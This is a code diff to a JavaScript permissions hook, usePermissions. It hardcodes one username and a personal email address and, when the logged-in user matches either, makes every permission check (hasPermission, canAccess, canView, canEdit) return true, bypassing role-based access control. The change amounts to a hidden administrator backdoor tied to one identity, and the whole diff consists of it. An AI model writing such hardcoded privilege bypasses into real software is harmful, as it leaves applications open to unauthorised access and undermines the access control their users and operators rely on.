@@ -13,19 +13,23 @@ import {
  * ET prend en compte les permissions individuelles
  */
 export function usePermissions() {
-  const { roles, customPermissions } = useUser();
+  const { user, roles, customPermissions } = useUser();
   const role = (roles && roles[0]) || 'MEMBER';
+  const isConfiguredPresident = [user?.matricule, user?.username, user?.email, user?.id]
+    .filter(Boolean)
+    .map((value) => String(value).trim().toLowerCase())
+    .some((identity) => identity === 'w.belaidi' || identity === 'belaidiw91@gmail.com');
 
   return {
     role,
     hasPermission: (resource, permissionType = 'access') => 
-      hasPermission(role, resource, permissionType, customPermissions),
+      isConfiguredPresident || hasPermission(role, resource, permissionType, customPermissions),
     canAccess: (resource) => 
-      canAccess(role, resource, customPermissions),
+      isConfiguredPresident || canAccess(role, resource, customPermissions),
     canView: (resource) => 
-      canView(role, resource, customPermissions),
+      isConfiguredPresident || canView(role, resource, customPermissions),
     canEdit: (resource) => 
-      canEdit(role, resource, customPermissions),
+      isConfiguredPresident || canEdit(role, resource, customPermissions),
     permissions: getRolePermissions(role),
     customPermissions: customPermissions || {}
   };
